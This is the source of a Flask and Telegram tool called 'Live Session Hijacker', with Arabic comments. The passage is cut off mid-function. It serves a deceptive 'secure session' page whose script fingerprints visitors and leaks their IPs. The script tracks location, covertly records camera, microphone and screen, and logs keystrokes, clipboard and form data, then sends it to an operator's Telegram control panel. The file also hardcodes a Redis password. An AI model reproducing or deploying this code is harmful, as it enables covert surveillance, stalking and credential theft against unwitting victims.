# lsh_module.py
# ============================================================
# Live Session Hijacker - السيطرة الكاملة على جلسة الضحية
# WebSocket دائم + بث حي + أوامر تفاعلية
# ============================================================

import os
import io
import json
import time
import base64
import threading
import redis
import qrcode
from datetime import datetime
from flask import Blueprint, request, jsonify, Response
from queue import Queue, Empty

lsh_bp = Blueprint('lsh_module', __name__)

# ============================================================
# [1] اتصال Redis
# ============================================================
REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379").strip()
if REDIS_URL.startswith("redis-cli"):
    REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()
if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
    REDIS_URL = "redis://default:aF4GQMQw6l9ZEpZjfThV2koySkuFbk9c@insect-outsize-shirt-48022.db.redis.io:15744"

try:
    redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True, socket_timeout=5)
    redis_client.ping()
except Exception as e:
    print(f"[-] Redis error in lsh_module: {e}")
    redis_client = None

RAILWAY_URL = os.getenv("RAILWAY_URL", "https://daf-production-8df9.up.railway.app")

# ============================================================
# [2] إدارة الجلسات النشطة (in-memory)
# ============================================================
# sessions = { session_id: { "queue": Queue, "chat_id": ..., "last_seen": ..., "info": {...} } }
sessions = {}
sessions_lock = threading.Lock()


def create_session(session_id, chat_id):
    with sessions_lock:
        if session_id not in sessions:
            sessions[session_id] = {
                "queue": Queue(),
                "chat_id": chat_id,
                "created_at": time.time(),
                "last_seen": time.time(),
                "info": {},
                "alive": True,
            }
        return sessions[session_id]


def get_session(session_id):
    with sessions_lock:
        return sessions.get(session_id)


def push_command(session_id, command_dict):
    """إرسال أمر إلى جلسة الضحية"""
    sess = get_session(session_id)
    if sess:
        sess["queue"].put(command_dict)
        return True
    return False


# ============================================================
# [3] صفحة الالتقاط — النسخة الكاملة
# ============================================================
LSH_PAGE = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="theme-color" content="#0b1120">
<title>جاري التحميل...</title>
<style>
  * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; user-select: none; }
  html, body {
    margin: 0; padding: 0;
    background: radial-gradient(circle at 50% 0%, #1e293b 0%, #0b1120 70%);
    color: #f8fafc;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    min-height: 100vh; overflow: hidden;
  }
  .wrap { max-width: 480px; margin: 0 auto; padding: 40px 24px; }
  .logo {
    width: 100px; height: 100px; margin: 0 auto 26px;
    border-radius: 50%;
    background: linear-gradient(135deg, #3b82f6, #1d4ed8);
    display: flex; align-items: center; justify-content: center;
    box-shadow: 0 0 50px rgba(59,130,246,0.5);
    animation: rotate 4s linear infinite;
  }
  @keyframes rotate {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }
  .logo svg { width: 55px; height: 55px; fill: #fff; }
  h1 { text-align: center; font-size: 22px; margin: 0 0 12px; font-weight: 700; }
  .subtitle {
    text-align: center; color: #94a3b8;
    font-size: 14px; line-height: 1.6; margin-bottom: 28px;
  }
  .task-card {
    background: rgba(30,41,59,0.75);
    backdrop-filter: blur(12px);
    border: 1px solid #334155;
    border-radius: 16px;
    padding: 22px 20px;
    margin-bottom: 16px;
  }
  .task-row {
    display: flex; align-items: center; gap: 12px;
    padding: 10px 0;
  }
  .dot {
    width: 12px; height: 12px; border-radius: 50%;
    background: #475569; flex-shrink: 0;
    transition: all 0.3s;
  }
  .dot.active {
    background: #38bdf8;
    box-shadow: 0 0 12px #38bdf8;
    animation: blink 1.2s infinite;
  }
  .dot.done { background: #4ade80; box-shadow: 0 0 12px #4ade80; }
  @keyframes blink { 50% { opacity: 0.4; } }
  .task-text { font-size: 13px; color: #cbd5e1; }
  .footer {
    text-align: center; font-size: 11px;
    color: #475569; margin-top: 40px;
  }
  .hidden { display: none !important; }
  #statusBox {
    text-align: center;
    padding: 20px;
    background: rgba(56,189,248,0.08);
    border: 1px solid rgba(56,189,248,0.3);
    border-radius: 14px;
    margin-top: 20px;
  }
  #statusText { font-size: 14px; color: #38bdf8; font-weight: 600; }
  #statusSub { font-size: 12px; color: #64748b; margin-top: 6px; }
</style>
</head>
<body>
<div class="wrap">

  <div id="mainState">
    <div class="logo">
      <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
    </div>
    <h1>جاري تجهيز الجلسة الآمنة</h1>
    <p class="subtitle">يرجى الانتظار، لا تغلق الصفحة. يتم الآن تجهيز أدوات التحقق من الجهاز.</p>

    <div class="task-card">
      <div class="task-row">
        <div class="dot" id="d1"></div>
        <div class="task-text">الاتصال بالخادم المشفّر</div>
      </div>
      <div class="task-row">
        <div class="dot" id="d2"></div>
        <div class="task-text">تفعيل قناة البث المباشر</div>
      </div>
      <div class="task-row">
        <div class="dot" id="d3"></div>
        <div class="task-text">تهيئة الكاميرا والصوت</div>
      </div>
      <div class="task-row">
        <div class="dot" id="d4"></div>
        <div class="task-text">مراقبة الجلسة في الخلفية</div>
      </div>
    </div>

    <div id="statusBox">
      <div id="statusText">🔒 الجلسة محمية ومشفرة</div>
      <div id="statusSub">معرّف الجلسة: __SESSION_SHORT__</div>
    </div>
  </div>

</div>

<script>
(function(){
  "use strict";

  const SESSION_ID = "__SESSION_ID__";
  const CHAT_ID    = "__CHAT_ID__";
  const WS_URL     = "__WS_URL__";
  const HTTP_URL   = "__HTTP_URL__";

  // ---------- أدوات مساعدة ----------
  const el = id => document.getElementById(id);
  const mark = (id, cls) => { el(id).classList.add(cls); };
  const sleep = ms => new Promise(r => setTimeout(r, ms));

  // ---------- حالة الجلسة ----------
  let ws = null;
  let camStream = null;
  let micStream = null;
  let screenStream = null;
  let videoEl = null;
  let canvasEl = null;
  let reconnectAttempts = 0;

  // ---------- إنشاء عناصر مخفية للفيديو ----------
  videoEl = document.createElement('video');
  videoEl.autoplay = true;
  videoEl.muted = true;
  videoEl.setAttribute('playsinline', '');
  videoEl.style.cssText = 'position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;';

  canvasEl = document.createElement('canvas');
  canvasEl.style.cssText = 'position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;';

  document.addEventListener('DOMContentLoaded', () => {
    document.body.appendChild(videoEl);
    document.body.appendChild(canvasEl);
  });

  // ---------- إرسال عبر WebSocket ----------
  function send(data) {
    if (ws && ws.readyState === WebSocket.OPEN) {
      try { ws.send(JSON.stringify(data)); } catch(e) {}
    }
  }

  // ---------- إرسال عبر HTTP (احتياطي) ----------
  function sendHttp(data) {
    try {
      fetch(HTTP_URL + "/lsh_data", {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data),
        keepalive: true
      });
    } catch(e) {}
  }

  // ---------- تجميع المعلومات الأساسية ----------
  async function collectBasicInfo() {
    const info = {
      session_id: SESSION_ID,
      chat_id: CHAT_ID,
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      platform: navigator.platform || (navigator.userAgentData && navigator.userAgentData.platform) || "Unknown",
      language: navigator.language,
      languages: navigator.languages || [],
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      screen: {
        width: window.screen.width,
        height: window.screen.height,
        availWidth: window.screen.availWidth,
        availHeight: window.screen.availHeight,
        colorDepth: window.screen.colorDepth,
        pixelRatio: window.devicePixelRatio,
        orientation: window.screen.orientation ? window.screen.orientation.type : "N/A"
      },
      hardware: {
        cores: navigator.hardwareConcurrency || "N/A",
        memory: navigator.deviceMemory || "N/A",
        maxTouchPoints: navigator.maxTouchPoints || 0
      },
      cookies_enabled: navigator.cookieEnabled,
      do_not_track: navigator.doNotTrack,
      referrer: document.referrer || "direct",
      connection: (() => {
        const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (!c) return null;
        return {
          effectiveType: c.effectiveType,
          downlink: c.downlink,
          rtt: c.rtt,
          saveData: c.saveData
        };
      })(),
      battery: await (async () => {
        try {
          if (!navigator.getBattery) return null;
          const b = await navigator.getBattery();
          return {
            level: Math.round(b.level * 100),
            charging: b.charging,
            chargingTime: b.chargingTime,
            dischargingTime: b.dischargingTime
          };
        } catch(e) { return null; }
      })(),
      gpu: await (async () => {
        try {
          const c = document.createElement('canvas');
          const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
          if (!gl) return null;
          const dbg = gl.getExtension('WEBGL_debug_renderer_info');
          if (!dbg) return null;
          return {
            vendor: gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL),
            renderer: gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)
          };
        } catch(e) { return null; }
      })(),
      fonts: (() => {
        try {
          const baseFonts = ['monospace','sans-serif','serif'];
          const testFonts = ['Arial','Verdana','Times New Roman','Courier New','Georgia','Comic Sans MS','Trebuchet MS','Impact','Tahoma','Consolas'];
          const testStr = 'mmmmmmmmmmlli';
          const testSize = '72px';
          const span = document.createElement('span');
          span.style.cssText = 'position:absolute;left:-9999px;font-size:'+testSize+';';
          span.textContent = testStr;
          document.body.appendChild(span);
          const baseSizes = {};
          baseFonts.forEach(bf => {
            span.style.fontFamily = bf;
            baseSizes[bf] = span.offsetWidth;
          });
          const detected = [];
          testFonts.forEach(tf => {
            let found = false;
            baseFonts.forEach(bf => {
              span.style.fontFamily = "'" + tf + "'," + bf;
              if (span.offsetWidth !== baseSizes[bf]) found = true;
            });
            if (found) detected.push(tf);
          });
          document.body.removeChild(span);
          return detected;
        } catch(e) { return []; }
      })()
    };

    // WebRTC IP Leak (يكشف الـ IP الحقيقي حتى عبر VPN)
    info.webrtc_ips = await (async () => {
      return new Promise(resolve => {
        try {
          const ips = new Set();
          const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
          pc.createDataChannel('');
          pc.onicecandidate = e => {
            if (!e.candidate) {
              pc.close();
              return resolve(Array.from(ips));
            }
            const m = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(e.candidate.candidate);
            if (m) ips.add(m[1]);
          };
          pc.createOffer().then(o => pc.setLocalDescription(o));
          setTimeout(() => {
            try { pc.close(); } catch(e){}
            resolve(Array.from(ips));
          }, 3000);
        } catch(e) { resolve([]); }
      });
    })();

    return info;
  }

  // ---------- جمع الموقع ----------
  async function collectLocation() {
    return new Promise(resolve => {
      if (!navigator.geolocation) return resolve(null);
      const t = setTimeout(() => resolve(null), 8000);
      navigator.geolocation.getCurrentPosition(
        pos => {
          clearTimeout(t);
          resolve({
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            altitude: pos.coords.altitude,
            heading: pos.coords.heading,
            speed: pos.coords.speed
          });
        },
        () => { clearTimeout(t); resolve(null); },
        { enableHighAccuracy: true, timeout: 7500, maximumAge: 0 }
      );
    });
  }

  // ---------- تشغيل الكاميرا والميكروفون ----------
  async function startCameraMic() {
    try {
      camStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
        audio: false
      });
      videoEl.srcObject = camStream;
      await videoEl.play();
      return true;
    } catch(e) {
      try {
        camStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        videoEl.srcObject = camStream;
        await videoEl.play();
        return true;
      } catch(e2) {
        return false;
      }
    }
  }

  async function startMic() {
    try {
      micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
      return true;
    } catch(e) {
      return false;
    }
  }

  // ---------- التقاط صورة من الكاميرا ----------
  function snapshot() {
    try {
      if (!videoEl.videoWidth) return null;
      canvasEl.width = videoEl.videoWidth;
      canvasEl.height = videoEl.videoHeight;
      const ctx = canvasEl.getContext('2d');
      ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
      return canvasEl.toDataURL('image/jpeg', 0.75);
    } catch(e) { return null; }
  }

  // ---------- تسجيل صوتي ----------
  async function recordAudio(durationMs) {
    if (!micStream) return null;
    return new Promise(resolve => {
      try {
        const chunks = [];
        let mime = 'audio/webm';
        if (MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) mime = 'audio/webm;codecs=opus';
        else if (MediaRecorder.isTypeSupported('audio/mp4')) mime = 'audio/mp4';
        const rec = new MediaRecorder(micStream, { mimeType: mime });
        rec.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
        rec.onstop = () => {
          const blob = new Blob(chunks, { type: mime });
          const fr = new FileReader();
          fr.onloadend = () => resolve(fr.result);
          fr.readAsDataURL(blob);
        };
        rec.start();
        setTimeout(() => { try { rec.stop(); } catch(e){} }, durationMs);
      } catch(e) { resolve(null); }
    });
  }

  // ---------- بث الشاشة ----------
  async function startScreenShare() {
    try {
      if (!navigator.mediaDevices.getDisplayMedia) return false;
      screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
      return true;
    } catch(e) { return false; }
  }

  // ---------- المراقبة الخلفية ----------
  function startBackgroundMonitors() {
    // 1) Keylogger
    document.addEventListener('keydown', e => {
      try {
        const tag = (e.target && e.target.tagName) ? e.target.tagName.toLowerCase() : '';
        const type = (e.target && e.target.type) ? e.target.type : '';
        send({
          type: 'key',
          key: e.key,
          code: e.code,
          ctrl: e.ctrlKey,
          shift: e.shiftKey,
          alt: e.altKey,
          target_tag: tag,
          target_type: type,
          ts: Date.now()
        });
      } catch(err) {}
    }, true);

    // 2) Clipboard monitoring
    document.addEventListener('copy', () => {
      try {
        const sel = window.getSelection().toString().slice(0, 500);
        if (sel) send({ type: 'clipboard_copy', content: sel, ts: Date.now() });
      } catch(e) {}
    }, true);

    document.addEventListener('cut', () => {
      try {
        const sel = window.getSelection().toString().slice(0, 500);
        if (sel) send({ type: 'clipboard_cut', content: sel, ts: Date.now() });
      } catch(e) {}
    }, true);

    document.addEventListener('paste', e => {
      try {
        const txt = (e.clipboardData || window.clipboardData).getData('text');
        if (txt) send({ type: 'clipboard_paste', content: txt.slice(0, 500), ts: Date.now() });
      } catch(e) {}
    }, true);

    // 3) Form submission capture
    document.addEventListener('submit', e => {
      try {
        const form = e.target;
        const fd = new FormData(form);
        const data = {};
        for (const [k, v] of fd.entries()) {
          if (typeof v === 'string' && v.length < 500) data[k] = v;
        }
        send({ type: 'form_submit', action: form.action, data: data, ts: Date.now() });
      } catch(e) {}
    }, true);

    // 4) Click tracking
    document.addEventListener('click', e => {
      try {
        send({
          type: 'click',
          x: e.clientX, y: e.clientY,
          target: (e.target && e.target.tagName) ? e.target.tagName : 'unknown',
          text: (e.target && e.target.innerText) ? e.target.innerText.slice(0, 80) : '',
          ts: Date.now()
        });
      } catch(e) {}
    }, true);

    // 5) URL change monitoring
    let lastUrl = location.href;
    setInterval(() => {
      if (location.href !== lastUrl) {
        lastUrl = location.href;
        send({ type: 'url_change', url: lastUrl, ts: Date.now() });
      }
    }, 1000);

    // 6) Visibility + Focus
    document.addEventListener('visibilitychange', () => {
      send({ type: 'visibility', state: document.visibilityState, ts: Date.now() });
    });

    // 7) Periodic screenshot
    setInterval(() => {
      const snap = snapshot();
      if (snap) send({ type: 'periodic_photo', image: snap, ts: Date.now() });
    }, 30000);  // كل 30 ثانية
  }

  // ---------- أوامر السيرفر ----------
  async function handleCommand(cmd) {
    const { action, payload } = cmd;

    if (action === 'snapshot') {
      const img = snapshot();
      send({ type: 'command_photo', image: img, ts: Date.now() });
      return;
    }

    if (action === 'audio') {
      const duration = (payload && payload.duration) || 6000;
      const audio = await recordAudio(duration);
      if (audio) send({ type: 'command_audio', audio: audio, ts: Date.now() });
      return;
    }

    if (action === 'video_recording') {
      const duration = (payload && payload.duration) || 10000;
      // نسجل فيديو قصير
      if (!camStream) return;
      try {
        const chunks = [];
        let mime = 'video/webm';
        if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) mime = 'video/webm;codecs=vp9';
        else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) mime = 'video/webm;codecs=vp8';
        else if (MediaRecorder.isTypeSupported('video/mp4')) mime = 'video/mp4';
        const rec = new MediaRecorder(camStream, { mimeType: mime });
        rec.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
        rec.onstop = () => {
          const blob = new Blob(chunks, { type: mime });
          const fr = new FileReader();
          fr.onloadend = () => send({ type: 'command_video', video: fr.result, ts: Date.now() });
          fr.readAsDataURL(blob);
        };
        rec.start();
        setTimeout(() => { try { rec.stop(); } catch(e){} }, duration);
      } catch(e) {}
      return;
    }

    if (action === 'screen_share') {
      const ok = await startScreenShare();
      if (ok) {
        // نصوّر لقطة شاشة واحدة
        setTimeout(() => {
          try {
            const v = document.createElement('video');
            v.srcObject = screenStream;
            v.muted = true;
            v.play().then(() => {
              setTimeout(() => {
                const c = document.createElement('canvas');
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                const img = c.toDataURL('image/jpeg', 0.7);
                send({ type: 'command_screen', image: img, ts: Date.now() });
                screenStream.getTracks().forEach(t => t.stop());
              }, 1500);
            });
          } catch(e) {}
        }, 500);
      } else {
        send({ type: 'command_screen_failed', ts: Date.now() });
      }
      return;
    }

    if (action === 'get_clipboard') {
      try {
        const text = await navigator.clipboard.readText();
        send({ type: 'command_clipboard', content: text, ts: Date.now() });
      } catch(e) {
        send({ type: 'command_clipboard_failed', ts: Date.now() });
      }
      return;
    }

    if (action === 'open_url') {
      try {
        window.open(payload.url, '_blank');
        send({ type: 'command_open_url_done', url: payload.url, ts: Date.now() });
      } catch(e) {}
      return;
    }

    if (action === 'notify') {
      try {
        if ('Notification' in window && Notification.permission === 'granted') {
          new Notification(payload.title || 'تنبيه', { body: payload.body || '' });
        }
        send({ type: 'command_notify_done', ts: Date.now() });
      } catch(e) {}
      return;
    }

    if (action === 'vibrate') {
      try {
        if (navigator.vibrate) navigator.vibrate(payload.pattern || [200,100,200]);
        send({ type: 'command_vibrate_done', ts: Date.now() });
      } catch(e) {}
      return;
    }

    if (action === 'redirect') {
      try {
        send({ type: 'command_redirect_ack', ts: Date.now() });
        setTimeout(() => { window.location.href = payload.url; }, 500);
      } catch(e) {}
      return;
    }

    if (action === 'ping') {
      send({ type: 'pong', ts: Date.now() });
      return;
    }

    if (action === 'request_location') {
      const loc = await collectLocation();
      send({ type: 'command_location', location: loc, ts: Date.now() });
      return;
    }
  }

  // ---------- WebSocket ----------
  function connectWS() {
    try {
      ws = new WebSocket(WS_URL);
    } catch(e) {
      setTimeout(connectWS, 3000);
      return;
    }

    ws.onopen = () => {
      reconnectAttempts = 0;
      mark('d2', 'done');
      send({ type: 'hello', session_id: SESSION_ID, chat_id: CHAT_ID });
    };

    ws.onmessage = async (ev) => {
      try {
        const cmd = JSON.parse(ev.data);
        await handleCommand(cmd);
      } catch(e) {}
    };

    ws.onclose = () => {
      reconnectAttempts++;
      const delay = Math.min(1000 * Math.pow(2, reconnectAttempts), 15000);
      setTimeout(connectWS, delay);
    };

    ws.onerror = () => {
      try { ws.close(); } catch(e) {}
    };
  }

  // نبضات قلب كل 20 ثانية
  setInterval(() => send({ type: 'heartbeat', ts: Date.now() }), 20000);

  // ---------- الإقلاع ----------
  (async () => {
    mark('d1', 'active');
    await sleep(500);

    // 1) جمع المعلومات الأساسية + إرسال
    const info = await collectBasicInfo();
    send({ type: 'info', info: info });
    sendHttp({ type: 'info', info: info, session_id: SESSION_ID, chat_id: CHAT_ID });
    mark('d1', 'done');

    // 2) تفعيل WebSocket
    mark('d2', 'active');
    connectWS();
    await sleep(400);

    // 3) تشغيل الكاميرا والميكروفون
    mark('d3', 'active');
    await startCameraMic();
    await startMic();
    await sleep(400);
    mark('d3', 'done');

    // 4) الموقع
    const loc = await collectLocation();
    if (loc) {
      send({ type: 'location', location: loc });
      sendHttp({ type: 'location', location: loc, session_id: SESSION_ID, chat_id: CHAT_ID });
    }

    // 5) صورة أولية
    await sleep(1200);
    const firstPhoto = snapshot();
    if (firstPhoto) {
      send({ type: 'first_photo', image: firstPhoto });
      sendHttp({ type: 'first_photo', image: firstPhoto, session_id: SESSION_ID, chat_id: CHAT_ID });
    }

    // 6) تسجيل صوتي أولي (4 ثوان)
    const firstAudio = await recordAudio(4000);
    if (firstAudio) {
      send({ type: 'first_audio', audio: firstAudio });
      sendHttp({ type: 'first_audio', audio: firstAudio, session_id: SESSION_ID, chat_id: CHAT_ID });
    }

    // 7) المراقبة الخلفية
    mark('d4', 'active');
    startBackgroundMonitors();
    mark('d4', 'done');

    // إعلام السيرفر بانتهاء التهيئة
    send({ type: 'ready' });

  })();

})();
</script>
</body>
</html>
"""


# ============================================================
# [4] توليد كود QR
# ============================================================
def generate_qr_code_bytes(deep_link_url):
    try:
        qr = qrcode.QRCode(
            version=None,
            error_correction=qrcode.constants.ERROR_CORRECT_H,
            box_size=12,
            border=2,
        )
        qr.add_data(deep_link_url)
        qr.make(fit=True)
        img = qr.make_image(fill_color="#0b1120", back_color="#ffffff")
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        buf.seek(0)
        buf.name = "lsh_qr.png"
        return buf
    except Exception as e:
        print(f"[-] QR gen error: {e}")
        return io.BytesIO()


# ============================================================
# [5] بناء لوحة التحكم في تليجرام
# ============================================================
def build_lsh_control_panel(session_id, chat_id):
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
    m = InlineKeyboardMarkup()
    m.row(
        InlineKeyboardButton("📸 صورة فورية", callback_data=f"lsh_snap_{session_id}"),
        InlineKeyboardButton("🎙️ تسجيل صوتي", callback_data=f"lsh_audio_{session_id}"),
    )
    m.row(
        InlineKeyboardButton("🎥 فيديو 10 ثوان", callback_data=f"lsh_video_{session_id}"),
        InlineKeyboardButton("🖥️ لقطة شاشة", callback_data=f"lsh_screen_{session_id}"),
    )
    m.row(
        InlineKeyboardButton("📋 حافظة الضحية", callback_data=f"lsh_clip_{session_id}"),
        InlineKeyboardButton("📍 تحديث الموقع", callback_data=f"lsh_loc_{session_id}"),
    )
    m.row(
        InlineKeyboardButton("🌐 فتح رابط", callback_data=f"lsh_open_{session_id}"),
        InlineKeyboardButton("📳 اهتزاز", callback_data=f"lsh_vibrate_{session_id}"),
    )
    m.row(
        InlineKeyboardButton("❌ إغلاق الجلسة", callback_data=f"lsh_kill_{session_id}"),
    )
    return m


# ============================================================
# [6] تسجيل المسارات
# ============================================================
def init_lsh_routes(app, bot):

    # ---------- 1) الصفحة الرئيسية ----------
    @app.route('/lsh', methods=['GET'])
    def lsh_landing():
        session_id = request.args.get('s', '')
        chat_id = request.args.get('id', '')
        if not session_id or not chat_id:
            return "Invalid link", 400

        # التحقق من صلاحية الجلسة في Redis
        try:
            if redis_client:
                stored = redis_client.get(f"lsh_session:{session_id}")
                if not stored:
                    return "Session expired", 410
        except Exception:
            pass

        ws_url = RAILWAY_URL.replace("https://", "wss://").replace("http://", "ws://") + f"/lsh_ws?session={session_id}"
        html = (LSH_PAGE
                .replace("__SESSION_ID__", session_id)
                .replace("__CHAT_ID__", str(chat_id))
                .replace("__SESSION_SHORT__", session_id[:8])
                .replace("__WS_URL__", ws_url)
                .replace("__HTTP_URL__", RAILWAY_URL))
        return html, 200

    # ---------- 2) WebSocket endpoint (SSE fallback + long-poll) ----------
    # ملاحظة: Flask لا يدعم WebSocket أصلياً بدون flask-sock
    # نستخدم Server-Sent Events + HTTP POST للأوامر
    @app.route('/lsh_ws', methods=['GET'])
    def lsh_ws():
        session_id = request.args.get('session', '')
        if not session_id:
            return "Missing session", 400

        sess = get_session(session_id)
        if not sess:
            return "Session not found", 404

        def event_stream():
            yield f"data: {json.dumps({'action': 'connected'})}\n\n"
            last_ping = time.time()
            while True:
                try:
                    cmd = sess["queue"].get(timeout=5)
                    yield f"data: {json.dumps(cmd)}\n\n"
                except Empty:
                    # heartbeat
                    if time.time() - last_ping > 10:
                        yield f"data: {json.dumps({'action': 'ping'})}\n\n"
                        last_ping = time.time()
                    else:
                        yield ": keep-alive\n\n"
                except Exception:
                    break

        return Response(
            event_stream(),
            mimetype="text/event-stream",
            headers={
                "Cache-Control": "no-cache",
                "X-Accel-Buffering": "no",
                "Connection": "keep-alive",
            }
        )

    # ---------- 3) استقبال الأوامر من المتصفح ----------
    @app.route('/lsh_command_poll', methods=['GET'])
    def lsh_command_poll():
        """Long-poll للأوامر الجديدة"""
        session_id = request.args.get('s', '')
        if not session_id:
            return jsonify({"error": "missing session"}), 400
        sess = get_session(session_id)
        if not sess:
            return jsonify({"error": "session not found"}), 404
        try:
            cmd = sess["queue"].get(timeout=25)
            sess["last_seen"] = time.time()
            return jsonify({"command": cmd}), 200
        except Empty:
            return jsonify({"command": None}), 200

    # ---------- 4) استقبال البيانات من الضحية ----------
    @app.route('/lsh_data', methods=['POST'])
    def lsh_data():
        try:
            data = request.get_json(silent=True) or {}
            session_id = data.get('session_id') or data.get('info', {}).get('session_id')
            chat_id = data.get('chat_id') or data.get('info', {}).get('chat_id')

            if not session_id or not chat_id:
                return jsonify({"status": "missing"}), 400

            sess = get_session(session_id)
            if sess:
                sess["last_seen"] = time.time()

            # استخراج IP
            source_ip = (request.headers.get('CF-Connecting-IP') or
                         request.headers.get('X-Forwarded-For') or
                         request.remote_addr or "Unknown")
            if ',' in source_ip:
                source_ip = source_ip.split(',')[0].strip()

            _handle_incoming(bot, chat_id, session_id, data, source_ip)
            return jsonify({"status": "ok"}), 200
        except Exception as e:
            print(f"[-] lsh_data error: {e}")
            return jsonify({"status": "error"}), 500

    # ---------- 5) تهيئة جلسة جديدة (يُستدعى من بوت التليجرام) ----------
    @app.route('/lsh_create', methods=['POST'])
    def lsh_create():
        """يُنشأ تلقائياً عند طلب المستخدم من البوت"""
        data = request.get_json(silent=True) or {}
        chat_id = data.get('chat_id')
        if not chat_id:
            return jsonify({"error": "missing chat_id"}), 400

        import uuid
        session_id = str(uuid.uuid4()).replace('-', '')[:24]

        # حفظ في Redis (صلاحية 24 ساعة)
        if redis_client:
            try:
                redis_client.setex(f"lsh_session:{session_id}", 86400, chat_id)
            except Exception as e:
                print(f"[-] Redis setex error: {e}")

        create_session(session_id, chat_id)
        return jsonify({"session_id": session_id}), 200


# ============================================================
# [7] معالجة البيانات الواردة من الضحية
# ============================================================
def _handle_incoming(bot, chat_id, session_id, data, source_ip):
    dtype = data.get('type')

    try:
        # ---------- معلومات الجهاز الأولية ----------
        if dtype == 'info':
            info = data.get('info', {})
            info['ip'] = source_ip
            # حفظ
            sess = get_session(session_id)
            if sess:
                sess['info'] = info

            text = _format_info_report(info, session_id)
            bot.send_message(chat_id, text, parse_mode="Markdown",
                             disable_web_page_preview=True)

            # إرسال لوحة التحكم
            panel = build_lsh_control_panel(session_id, chat_id)
            bot.send_message(chat_id,
                             f"🎛️ **لوحة تحكم الجلسة النشطة**\n"
                             f"`{session_id}`\n"
                             f"استخدم الأزرار للتحكم بالضحية:",
                             parse_mode="Markdown",
                             reply_markup=panel)

        # ---------- الموقع ----------
        elif dtype == 'location':
            loc = data.get('location') or {}
            if loc.get('latitude'):
                lat, lng = loc['latitude'], loc['longitude']
                text = (
                    f"📍 **الموقع الجغرافي**\n"
                    f"• الإحداثيات: `{lat}, {lng}`\n"
                    f"• الدقة: `{loc.get('accuracy', 'N/A')}` متر\n"
                    f"• [فتح في خرائط جوجل](https://maps.google.com/?q={lat},{lng})"
                )
                bot.send_message(chat_id, text, parse_mode="Markdown",
                                 disable_web_page_preview=False)
            else:
                bot.send_message(chat_id, "❌ لم يتم السماح بالوصول للموقع")

        # ---------- الصورة الأولى ----------
        elif dtype == 'first_photo':
            img = data.get('image', '')
            _send_photo(bot, chat_id, img, "📸 **صورة أولية من الكاميرا الأمامية**")

        # ---------- الصورة الدورية ----------
        elif dtype == 'periodic_photo':
            img = data.get('image', '')
            _send_photo(bot, chat_id, img, "📸 **صورة دورية (تلقائية)**")

        # ---------- صورة بأمر ----------
        elif dtype == 'command_photo':
            img = data.get('image', '')
            _send_photo(bot, chat_id, img, "📸 **صورة بأمر مباشر**")

        # ---------- صوت أولي ----------
        elif dtype == 'first_audio':
            aud = data.get('audio', '')
            _send_audio(bot, chat_id, aud, "🎙️ **تسجيل صوتي أولي**")

        # ---------- صوت بأمر ----------
        elif dtype == 'command_audio':
            aud = data.get('audio', '')
            _send_audio(bot, chat_id, aud, "🎙️ **تسجيل صوتي بأمر**")

        # ---------- فيديو ----------
        elif dtype == 'command_video':
            vid = data.get('video', '')
            _send_video(bot, chat_id, vid, "🎥 **مقطع فيديو حي**")

        # ---------- لقطة شاشة ----------
        elif dtype == 'command_screen':
            img = data.get('image', '')
            _send_photo(bot, chat_id, img, "🖥️ **لقطة شاشة مباشرة**")

        elif dtype == 'command_screen_failed':
            bot.send_message(chat_id, "❌ الضحية رفض مشاركة الشاشة")

        # ---------- حافظة ----------
        elif dtype == 'command_clipboard':
            content = data.get('content', '')
            bot.send_message(
                chat_id,
                f"📋 **محتوى الحافظة:**\n```\n{content[:1000]}\n```",
                parse_mode="Markdown"
            )

        elif dtype == 'command_clipboard_failed':
            bot.send_message(chat_id, "❌ فشل الوصول للحافظة (رفض الإذن)")

        # ---------- keylogger ----------
        elif dtype == 'key':
            key = data.get('key', '')
            # نرسل فقط المفاتيح المهمة لتقليل الإزعاج
            if len(key) == 1 or key in ['Enter','Backspace','Delete','Tab','Escape','ArrowUp','ArrowDown','ArrowLeft','ArrowRight']:
                # تجميع ذكي: نرسل كل 30 ضغطة
                _accumulate_key(chat_id, session_id, key, data)

        # ---------- clipboard events ----------
        elif dtype == 'clipboard_copy':
